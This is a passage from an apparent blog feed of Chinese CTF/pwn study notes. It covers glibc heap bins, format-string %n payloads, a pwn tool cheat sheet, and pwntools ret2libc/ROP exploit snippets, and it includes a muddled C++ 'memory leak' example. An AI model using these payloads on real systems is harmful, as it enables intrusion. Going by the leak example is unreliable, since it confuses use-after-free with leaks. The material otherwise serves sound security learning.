href="#bin-垃圾桶-回收站" class="headerlink" title="bin(垃圾桶/回收站)"></a>bin(垃圾桶/回收站)</h3><p><img src="/2024/08/09/er-jin-zhi-an-quan/dui-yi-chu/dui-guan-li-qi-yuan-li/image-20240810151036332.png" alt="image-20240810151036332"></p><h4 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h4><p>顾名思义，未分类的回收站</p><ul><li>管理刚刚释放还未分类的<code>chunk</code></li><li>可以视为空闲<code>chunk</code>回归其所属<code>bin</code>之前的缓冲区</li></ul><h4 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h4><h4 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h4><h4 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h4><p><img src="/2024/08/09/er-jin-zhi-an-quan/dui-yi-chu/dui-guan-li-qi-yuan-li/image-20240810160309301.png" alt="image-20240810160309301"></p><p><img src="/2024/08/09/er-jin-zhi-an-quan/dui-yi-chu/dui-guan-li-qi-yuan-li/image-20240810172140667.png" alt="image-20240810172140667"></p><h4 id="tcache-bin"><a href="#tcache-bin" class="headerlink" title="tcache bin"></a>tcache bin</h4><p><code>super fast bin</code>:它比<code>fast bin</code>还要快。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 二进制安全,堆溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>格式化字符串漏洞</title>
      <link href="/2024/08/08/er-jin-zhi-an-quan/ge-shi-hua-zi-fu-chuan-lou-dong/"/>
      <url>/2024/08/08/er-jin-zhi-an-quan/ge-shi-hua-zi-fu-chuan-lou-dong/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞功能"><a href="#漏洞功能" class="headerlink" title="漏洞功能"></a>漏洞功能</h2><h3 id="泄露栈上的内容"><a href="#泄露栈上的内容" class="headerlink" title="泄露栈上的内容"></a>泄露栈上的内容</h3><p><code>%p</code></p><h3 id="泄露任意地址内容"><a href="#泄露任意地址内容" class="headerlink" title="泄露任意地址内容"></a>泄露任意地址内容</h3><p><code>%s</code></p><h3 id="篡改栈内存"><a href="#篡改栈内存" class="headerlink" title="篡改栈内存"></a>篡改栈内存</h3><p><code>%n   %hn  %hhn</code></p><p><code>%n</code>：把已打印的字符的个数写入目标地址</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>x_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"%11$n"</span><span class="token comment"># 本题的key是x=4,因为x_addr本身就是四字节，所以打印出我们输入的payload后%n=4，然后%n会把4写入到x_addr中，使得x=4</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="篡改任意地址内存"><a href="#篡改任意地址内存" class="headerlink" title="篡改任意地址内存"></a>篡改任意地址内存</h3><p><code>%n   %hn  %hhn</code></p><h2 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h2><ol><li>找到要泄露的地址在栈上是<code>printf</code>的格式化字符串的第几个参数（字符串是<code>printf</code>的第一个参数，格式化字符串的第一个参数是<code>printf</code>的第二个参数，以此类推）</li><li>假设我们要泄露的地址是格式化字符串的第4个参数，如果我们要知道它的地址（即存在栈上的内容），就<code>payload=%4$p</code>,如果要获得想要泄露的地址处存放的内容，就<code>paylod=%4$s</code></li><li>如果是64位程序，则它的格式化字符串的前六个参数存放在<code>rdi rsi rdx rcx r8 r9</code>寄存器中，所以从第六个格式化字符串参数开始才存放在栈上，但是我们可能不知道栈上的地址分别对应格式化字符串的第几个参数，所以我们可以先向程序发送<code>%6$p %7$p %8$p</code>，根据它输出的地址我们可以知道栈上存放的地址分别对应格式化字符串的第几个参数，然后我们就可以知道我们想要获取的地址是格式化字符串的第几个参数，然后输入<code>%几$p</code>或<code>%几$s</code>对其进行泄露。</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 二进制安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn相关工具使用</title>
      <link href="/2024/08/06/er-jin-zhi-an-quan/pwn-xiang-guan-gong-ju-shi-yong/"/>
      <url>/2024/08/06/er-jin-zhi-an-quan/pwn-xiang-guan-gong-ju-shi-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h1><p>查看程序的保护</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">checksec   --file<span class="token operator">=</span><span class="token string">'./vul'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h1><p>查看程序中指令片段地址</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ropgadget   --binary  ./vul   --only  <span class="token string">'pop|ret'</span>  <span class="token operator">|</span> <span class="token function">grep</span> raxropgadget   --binary  ./ret2libc   --string  <span class="token string">'/bin/sh'</span>   <span class="token comment"># 查找程序中/bin/sh字符串的地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h1><p>通过libc文件中本身含有的代码片段来调用一个shell</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">one_gadget libc-2.23.so<span class="token comment"># 查看libc中含有的代码片段</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a>pwndbg</h1><p>动态调试</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">start    <span class="token comment"># 使程序执行到main函数（程序入口处）停下来，等于b main;  run;</span>b main   <span class="token comment"># 打断点到main函数</span>n  next    <span class="token comment"># 执行下一条指令(单步执行)---步过</span>s  step    <span class="token comment"># 步入</span>c  <span class="token builtin class-name">continue</span>  <span class="token comment"># 继续执行</span>finish   <span class="token comment"># 结束当前函数</span>stack <span class="token number">20</span>   <span class="token comment"># 查看20条栈的内容</span>telescope  <span class="token variable">$ebp</span>     <span class="token comment"># 查看栈中ebp附近的内容</span>x/20i  地址    <span class="token comment"># 查看该地址及以后的20条汇编指令（i代表intel）</span>x/20wx      <span class="token comment"># 查看20个8字节地址的栈内容</span>x/20gx       <span class="token comment"># 查看20个4字节地址的栈内容</span>x/s   地址<span class="token comment"># 查看该地址处的字符串</span>distance   地址1   地址2      <span class="token comment"># 计算出两个地址的距离</span><span class="token builtin class-name">set</span> disassembly-flavor intel   <span class="token comment"># 如果汇编代码为AT&amp;T,则可以使用这条命令来转换为intel格式的汇编</span>disass  函数名   <span class="token comment"># 将指定函数进行反汇编</span>disass   <span class="token comment"># 将当前所在的函数进行反汇编</span>info functions    <span class="token comment"># 查看所有函数符号表</span>info reg   <span class="token comment"># 查看当前所有寄存器的信息</span>info breakpoints  <span class="token comment"># 列出所有断点信息</span>info args   <span class="token comment"># 显示当前函数参数</span>info locals  <span class="token comment"># 打印本地局部变量</span>info variables  <span class="token comment"># 打印全局变量名称</span>del <span class="token number">1</span>  <span class="token comment"># 删除编号为1的断点</span>del <span class="token comment"># 删除所有断点</span><span class="token function">clear</span> *0x00400123   <span class="token comment"># 清除指定内存地址的断点</span>disable <span class="token number">2</span>  <span class="token comment"># 禁用指定编号断点</span><span class="token builtin class-name">enable</span> <span class="token number">2</span>  <span class="token comment"># 启动指定编号断点</span>print /x <span class="token variable">$rdi</span>   <span class="token comment"># 以十六进制输出rdi寄存器中的值</span>layout regs  <span class="token comment"># 切换布局，同时显示寄存器信息和汇编代码</span>tui disable   <span class="token comment"># 回归原本的布局</span>attach <span class="token punctuation">{</span>process-id<span class="token punctuation">}</span>   <span class="token comment"># 链接到正在运行的进程，并进行调试</span>detach      <span class="token comment"># 断开链接</span>show commands   <span class="token comment"># 查看历史命令</span><span class="token operator">&lt;</span>enter<span class="token operator">&gt;</span>（回车）  <span class="token comment"># 执行上一条命令</span><span class="token builtin class-name">source</span> <span class="token punctuation">{</span>filepath<span class="token punctuation">}</span>   <span class="token comment"># 从文件中加载gdb命令</span>q   <span class="token comment"># 退出gdb</span>pwndbg   <span class="token comment"># 查看pwndbg命令帮助</span>list main  <span class="token comment"># 查看指定函数附近的汇编代码</span>list *0x00400800   <span class="token comment"># 查看指定地址附近的代码</span>frame  <span class="token comment"># 打印当前运行的栈帧</span>backtrace   <span class="token comment"># 打印backtrace</span>dt FILE   <span class="token comment"># 打印指定类型的信息</span>dt <span class="token string">"struct malloc_state"</span>   <span class="token comment"># 显示malloc_state结构体信息（有各个字段的偏移）</span>xinfo <span class="token punctuation">[</span>address<span class="token punctuation">]</span>  <span class="token comment"># 显示指定地址到有用位置的偏移</span>vis_heap_chunks    <span class="token comment"># 可视化显示当前堆的分配情况</span>malloc_chunk <span class="token punctuation">[</span>addr<span class="token punctuation">]</span>   <span class="token comment"># 打印出指定地址的malloc_chunk</span><span class="token builtin class-name">set</span> follow-fork-mode parent/child   <span class="token comment"># 设置当进程调用fork时是否进入子进程</span>vmmap   <span class="token comment"># 显示目标程序的虚拟内存布局信息，包括堆、栈的起始地址和大小，共享库的范围。</span>b *<span class="token variable">$rebase</span><span class="token punctuation">(</span>0x18540<span class="token punctuation">)</span>    <span class="token comment">#对开启pie的程序根据偏移地址下断点</span>attach 进程pid  <span class="token punctuation">;</span>  <span class="token builtin class-name">return</span>  <span class="token comment"># 调试exp的进程,进去后然后return</span>libc   <span class="token comment">#查看libc的基地址</span>fmtarg  <span class="token operator">&lt;</span>address<span class="token operator">&gt;</span>     <span class="token comment"># 查看某一地址是格式化字符串的第几个参数</span>heap  <span class="token comment"># 查看已分配的堆</span>vis_heap_chunks   <span class="token comment"># 查看堆空间的chunksz</span>bins  <span class="token comment"># 查看bin的状态</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2024/08/06/er-jin-zhi-an-quan/pwn-xiang-guan-gong-ju-shi-yong/clipboard.png" alt="img"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/x  十六进制/d  十进制/o  八进制/t  二进制/i  汇编代码/s  字符串/b   <span class="token number">1</span>字节/w   <span class="token number">4</span>字节/g   <span class="token number">8</span>字节<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="shell命令"><a href="#shell命令" class="headerlink" title="shell命令"></a>shell命令</h1><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ldd ./test.out   <span class="token comment"># 查看test.out的libc文件软链接路径</span><span class="token function">file</span> 软链接地址   <span class="token comment"># 查看软链接实际指向的文件路径</span>strings vul <span class="token operator">|</span><span class="token function">grep</span> flag     <span class="token comment"># 查找vul程序中的字符串，并过滤出flag字符串</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="radare2"><a href="#radare2" class="headerlink" title="radare2"></a>radare2</h1><p>二进制分析框架，kali自带</p><p>radare2与gdb的区别：radare2是静态分析工具，gdb是动态调试工具</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">rabin2 -l vul    <span class="token comment"># radare2的一个子程序，打印出vul文件的系统属性、语言、字节序、框架、以及使用了哪些加固技术</span>r2  ./vul   <span class="token comment"># 启动radare2来分析vul程序</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>工具启动后的操作命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ie  <span class="token comment"># 手动打印出程序入口点</span>fs   <span class="token comment"># 查看所有的flags，一个flag是所有类似特征的集合</span>fs imports<span class="token punctuation">;</span>f  <span class="token comment"># 打印出imports集合中的内容，打印其他集合中的内容也类似</span>iz   <span class="token comment"># 输出只读数据段中的字符串</span>axt @@str.*   <span class="token comment"># 在data/code段里寻找某个地址相关的引用   然后再加上afl把相关信息打印出来</span>ax?  <span class="token comment"># 查看相关帮助信息</span>@@?   <span class="token comment"># 查看相关帮助信息</span>s main  <span class="token comment"># 把程序停在main函数</span>pdf   <span class="token comment"># (print disamble) 输出反汇编代码</span>pdf@sym.beet   <span class="token comment"># 对sys.beet函数进行反汇编</span>ahi s @@<span class="token operator">=</span>地址  <span class="token comment"># 用来设置字符串特定的偏移地址 </span>ood xxxx   <span class="token comment"># 输入xxxx字符串对程序进行调试</span><span class="token function">dc</span>  <span class="token comment"># 输出上一条命令的调试结果</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="rahash2子程序"><a href="#rahash2子程序" class="headerlink" title="rahash2子程序"></a>rahash2子程序</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">rahash2 -E rot -S s:13 -s <span class="token string">'Megabeets'</span>    <span class="token comment"># 求出这个字符串的校验值</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="patchelf"><a href="#patchelf" class="headerlink" title="patchelf"></a>patchelf</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">patchelf --replace-needed libc.so.6 ./libc-2.23.so ./pwn   <span class="token comment"># 替换动态库</span>patchelf --set-interpreter /lib64/ld-linux-x86-64.so.2 ./ld-linux-x86-64.so.2 ./pwn  <span class="token comment"># 设置动态库解析器</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 二进制安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈溢出之exp</title>
      <link href="/2024/08/06/er-jin-zhi-an-quan/zhan-yi-chu/zhan-yi-chu-zhi-exp/"/>
      <url>/2024/08/06/er-jin-zhi-an-quan/zhan-yi-chu/zhan-yi-chu-zhi-exp/</url>
      
        <content type="html"><![CDATA[<p><img src="/2024/08/06/er-jin-zhi-an-quan/zhan-yi-chu/zhan-yi-chu-zhi-exp/image-20240809194735850.png" alt="image-20240809194735850"></p><p>首先加载库函数  （pwntools）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment"># 字符串类型的shellcode</span>asm<span class="token punctuation">(</span><span class="token punctuation">)</span>    asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># 将字符串打包成机器可执行的字节码,通常需要对shellcode进行打包</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span>  <span class="token string">'amd64'</span>      <span class="token comment"># 将架构改为64位</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./vul'</span><span class="token punctuation">)</span>       <span class="token comment"># 加载这个程序的进程</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"xxx"</span><span class="token punctuation">)</span>    <span class="token comment"># 让程序断在xxx的位置</span>test <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>     <span class="token comment"># 接收8个字符给test</span><span class="token builtin">int</span><span class="token punctuation">(</span>test<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>   <span class="token comment"># 把字符串类型的test转换成16进制的整数类型</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token comment"># 向程序发送payload</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 执行程序</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./ret2libc'</span><span class="token punctuation">)</span>    <span class="token comment"># 通过ELF()函数来加载程序，后续便可通过elf.plt来调用程序中的函数</span>system_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>     <span class="token comment"># 通过plt表获取程序中system函数的地址</span><span class="token builtin">next</span><span class="token punctuation">(</span>elf<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token comment"># 直接通过next和elf.search函数找到"/bin/sh"字符串的地址</span>cyclic<span class="token punctuation">(</span><span class="token number">0x88</span><span class="token punctuation">)</span>  <span class="token comment"># 随机生成0x88长度的垃圾字符</span>p32<span class="token punctuation">(</span><span class="token number">0x123</span><span class="token punctuation">)</span>  <span class="token comment"># 将字符串转换为字节码</span><span class="token builtin">hex</span><span class="token punctuation">(</span>u32<span class="token punctuation">(</span><span class="token string">'\x巴拉巴拉'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># 将字节码转换为字符串并以十六进制显示</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc-2.23.so"</span><span class="token punctuation">)</span>write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>     <span class="token comment"># 得到write在got表中表项的地址，这个表项中存放的才是write的真实地址，**非常重要****</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>write_got<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b":"</span><span class="token punctuation">)</span>write_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token comment"># 这里是程序中有输出我们输入的地址处的内容的功能，所以我们结合此输出获取到write在libc中的真实地址</span>libc_write <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>   <span class="token comment"># 得到write函数在libc中的偏移</span>libc_base <span class="token operator">=</span> write_addr <span class="token operator">-</span> libc_write    <span class="token comment"># write的真实地址-write在libc中的偏移地址  ==&gt; 得到libc的基地址</span><span class="token comment"># 如果程序中没有system函数，那么plt表中就没有system地址，所以只能从libc中去找system</span>libc_system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>   <span class="token comment"># 得到libc中system的地址(libc的基地址+system在libc中的偏移)</span>libc_bin_sh <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 得到libc中/bin/sh的地址(libc的基地址+/bin/sh在libc中的偏移)</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token comment"># 将字符代码（ascll码）转换为字符串</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token comment"># 将字符串转换成ascll码</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"/bin/sh\x00"</span><span class="token punctuation">)</span> <span class="token comment"># \x00是截断符</span>flat<span class="token punctuation">(</span>xxx<span class="token punctuation">)</span>   <span class="token comment"># 将xxx扩展成一个单位字长的字节型数据，即p32(xxx)/p64(xxx)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 将exp在此处断下来，并生成一个进程pid</span>addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'AAA'</span><span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>  <span class="token comment"># drop=True的作用是不包括'AAA'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2024/08/06/er-jin-zhi-an-quan/zhan-yi-chu/zhan-yi-chu-zhi-exp/image-20240807234201274.png" alt="image-20240807234201274"></p><p><strong>所以拿到elf.got[‘write’]后，它的内容才是write在libc中的实际地址。并且由此可见，got表中存放的的确是函数的实际地址。这二者并不矛盾。</strong></p><p><code>sendline</code> 和 <code>send</code>的区别：<code>sendline</code>会默认输入一个换行符，而<code>send</code>不会；</p><p><code>fgets</code>和<code>read</code>的区别：<code>fgets</code>函数读入数据时遇到换行符会停止，而<code>read</code>会把包括换行符的所有字符全部读入进去。</p><h2 id="ret2libc的溢出规则"><a href="#ret2libc的溢出规则" class="headerlink" title="ret2libc的溢出规则"></a>ret2libc的溢出规则</h2><h3 id="函数执行原理"><a href="#函数执行原理" class="headerlink" title="函数执行原理"></a>函数执行原理</h3><p><strong>注意：ret2libc中栈中指令的执行是隔一个来执行的</strong></p><p>原因：system函数和exit函数的汇编指令开头都是push ebp;mov ebp,esp;即会申请自己的一块栈帧，但父函数会保存子函数的参数和返回地址（子函数会保存父函数的ebp），所以system上面的地址保存的是它的返回地址，再往上才是它的栈帧。子函数会保存父函数的ebp，exit函数也是同样的原理。下图中上边为高地址，下边为低地址。system的下方为它的栈帧，高地址处的”bin/sh“为它的参数。（<strong>栈溢出都是从低地址向高地址进行溢出（小端），函数调用时执行汇编指令我们也会发现，先传入参数（高地址），然后再调用函数（低地址）</strong>）</p><p><img src="/2024/08/06/er-jin-zhi-an-quan/zhan-yi-chu/zhan-yi-chu-zhi-exp/clipboard.png" alt="img"></p><h3 id="构造rop链通用结构"><a href="#构造rop链通用结构" class="headerlink" title="构造rop链通用结构"></a>构造rop链通用结构</h3><p>这个行为也称为平衡栈（在调用函数后清楚栈上push的内容），即在调用plt表中的函数后面加一个pop ret的指令片段。</p><p><img src="/2024/08/06/er-jin-zhi-an-quan/zhan-yi-chu/zhan-yi-chu-zhi-exp/clipboard-17229184811571.png" alt="img"></p><p><img src="/2024/08/06/er-jin-zhi-an-quan/zhan-yi-chu/zhan-yi-chu-zhi-exp/image-20240807171626125.png" alt="image-20240807171626125"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 示例payload</span>payload <span class="token operator">=</span> cyclic<span class="token punctuation">(</span><span class="token number">0x88</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>gets_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_ebx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_ebx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>buf<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"/bin/sh\x00"</span><span class="token punctuation">)</span>    <span class="token comment"># 把/bin/sh输入到buf中</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>64位的exp构造rop链要注意函数的参数要通过寄存器来传递</strong></p><h2 id="ret2syscall-和-ret2libc-64位-的区别"><a href="#ret2syscall-和-ret2libc-64位-的区别" class="headerlink" title="ret2syscall 和 ret2libc(64位)的区别"></a>ret2syscall 和 ret2libc(64位)的区别</h2><ul><li><strong>ret2syscall是通过查找pop eax;ret;   pop rbx;ret;   pop rcx;ret;   pop rdx;ret; 等指令片段的地址来构造rop链，最终执行某个函数的功能</strong>，如execve()函数的eax是0xb，最终实现的是execve(/bin/sh,0,0);构造好rop链后执行int 0x80(32位的系统调用，64位是syscall)来使上面构造好的rop链系统调用函数执行。</li><li><strong>ret2libc是通过查找plt表中的程序本来就有的函数(如system、read函数等)来实现shell的获取</strong>(如实现system(‘/bin/sh’)来获取shell)，32位的函数参数通过栈传递，所以不需要构造rop链，<strong>但需要注意的是执行libc时栈中数据是隔一个来执行的</strong>，见上图。64位系统的函数参数需要通过寄存器来传递，所以才需要构造rop链来传递参数。64位传递参数的寄存器依次为rdi,rsi,rdx,rcx,rbx,r8,r9，必须按照这个顺序来构造rop链传递参数，并且是先传参，后执行函数。</li></ul><h3 id="libc-调用函数过程"><a href="#libc-调用函数过程" class="headerlink" title="libc 调用函数过程"></a>libc 调用函数过程</h3><p><img src="/2024/08/06/er-jin-zhi-an-quan/zhan-yi-chu/zhan-yi-chu-zhi-exp/clipboard-17229184811582.png" alt="img"></p><p><img src="/2024/08/06/er-jin-zhi-an-quan/zhan-yi-chu/zhan-yi-chu-zhi-exp/clipboard-17229184811583.png" alt="img"></p><h2 id="动态链接程序的执行过程"><a href="#动态链接程序的执行过程" class="headerlink" title="动态链接程序的执行过程"></a>动态链接程序的执行过程</h2><p><img src="/2024/08/06/er-jin-zhi-an-quan/zhan-yi-chu/zhan-yi-chu-zhi-exp/clipboard-17229191243768.png" alt="img"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 二进制安全,栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内存泄漏</title>
      <link href="/2024/08/02/dai-ma-an-quan-yu-shen-ji/nei-cun-xie-lou/"/>
      <url>/2024/08/02/dai-ma-an-quan-yu-shen-ji/nei-cun-xie-lou/</url>
      
        <content type="html"><![CDATA[<h2 id="姿势"><a href="#姿势" class="headerlink" title="姿势"></a>姿势</h2><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int a = new int;a = 1;free(a);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>原理：如果free掉该内存后，仍然访问该内存地址，导致泄露</p>]]></content>
      
      
      
        <tags>
            
            <tag> 代码安全与审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AFL</title>
      <link href="/2024/08/01/fuzz/afl/"/>
      <url>/2024/08/01/fuzz/afl/</url>
      
